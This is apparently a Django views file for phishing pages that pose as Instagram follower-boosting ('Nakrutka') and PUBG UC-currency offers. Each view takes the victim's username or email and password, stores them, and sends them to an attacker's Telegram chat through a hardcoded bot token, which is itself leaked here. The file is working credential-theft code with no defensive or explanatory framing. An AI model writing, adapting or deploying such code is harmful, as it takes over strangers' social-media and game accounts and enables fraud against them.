from .models import *
import requests
from django.shortcuts import render

TELEGRAM_BOT_TOKEN = "7760257279:AAGgiolbiVaVv3hB1Dn3TvNGrz45WQq7UM4"


def home1(request,id):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        nakturka = Nakrutka(
            username=username,
            password=password,
        )
        nakturka.save()

        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n\n@passwords873bot"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    return render(request, "Nakrutka/index1.html")


def home2(request,id):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        nakturka = Nakrutka(
            username=username,
            password=password,
        )
        nakturka.save()

        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n\n@passwords873bot"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    return render(request, "Nakrutka/index2.html")


def home3(request,id):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        nakturka = Nakrutka(
            username=username,
            password=password,
        )
        nakturka.save()

        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n\n@passwords873bot"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    return render(request, "Nakrutka/index3.html")

def pubg(request,id):
    if request.method == 'POST':
        game_id = request.POST.get('game_id')
        server = request.POST.get('server')
        uc_amount = request.POST.get('uc_amount')
        email = request.POST.get('email')
        password = request.POST.get('password')
        terms = request.POST.get('terms') == 'on'

        order = UCOrder(
            game_id=game_id,
            server=server,
            uc_amount=uc_amount,
            email=email,
            password=password,
            terms=terms
        )
        order.save()
        text = (
            f"👮🏻‍♀️ Pubg account 💋\n\n"
            f"📧 *Email*: ```{email}```\n"
            f"🔒 *Parol*: ```{password}```\n\n@passwords873bot"
        )
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                      data={"chat_id": id, "text": text, "parse_mode": "MarkdownV2"})

        return render(request, 'Pubg/uc_olindi.html',{"uc_amount":uc_amount})
    return render(request, 'Pubg/index.html')


def uc_olindi(request):
    return render(request, 'Pubg/uc_olindi.html')

